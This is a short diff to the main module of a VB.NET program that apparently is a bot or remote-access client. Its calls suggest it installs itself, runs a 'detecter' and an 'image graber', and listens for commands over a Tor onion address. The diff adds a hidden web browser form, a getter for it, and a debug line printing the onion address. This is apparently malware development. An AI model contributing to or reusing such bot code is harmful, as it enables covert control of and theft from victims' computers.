@@ -29,8 +29,9 @@ Module Main
             _command = value
         End Set
     End Property
-
-    Sub Main()
+    Public Property MainThreadCreateWebBrowserForm As WebBrowserForm
+    <STAThread()>
+    Public Sub Main()
         configBot()
         NewDetecter.Start()
         Install()
@@ -41,9 +42,14 @@ Module Main
         If Not File.Exists(GetLocal_path() & "\Images.txt") Then
             NewImageGraber.Start()
         End If
+        MainThreadCreateWebBrowserForm = New WebBrowserForm
     End Sub
+    Public Function GetWebrowser()
+        Return MainThreadCreateWebBrowserForm
+    End Function
     Public Sub Listener()
         If Config.Variables.Debug Then
+            Console.WriteLine("Onion Address: " & GetOnionAddress())
             Console.WriteLine("Listening") 'Debugging
         End If
         Dim tcplistener As New TcpListen()
@@ -77,4 +83,5 @@ Module Main
         Dim configjson = JsonConvert.DeserializeAnonymousType(File_reader("Config.json"), New ConfigBotModel)
         Config = configjson
     End Sub
+
 End Module
